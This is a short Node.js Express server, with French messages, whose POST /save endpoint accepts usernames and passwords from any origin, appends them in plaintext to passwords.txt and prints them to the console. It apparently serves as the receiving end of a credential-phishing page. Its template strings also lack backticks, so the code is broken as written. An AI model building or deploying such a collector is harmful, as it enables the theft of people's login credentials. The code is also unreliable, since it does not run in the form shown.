const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json());

const DATA_FILE = path.join(__dirname, "passwords.txt");

app.get("/", (req, res) => {
    res.send("Serveur en ligne - OK");
});

app.post("/save", (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Champs manquants" });
    }

    const line = User: ${username} | Pass: ${password}\n;

    fs.appendFile(DATA_FILE, line, (err) => {
        if (err) {
            console.error("Erreur écriture :", err);
            return res.status(500).json({ error: "Erreur serveur" });
        }

        console.log("Données enregistrées:", line);
        res.json({ success: true });
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(Serveur online sur port ${PORT}));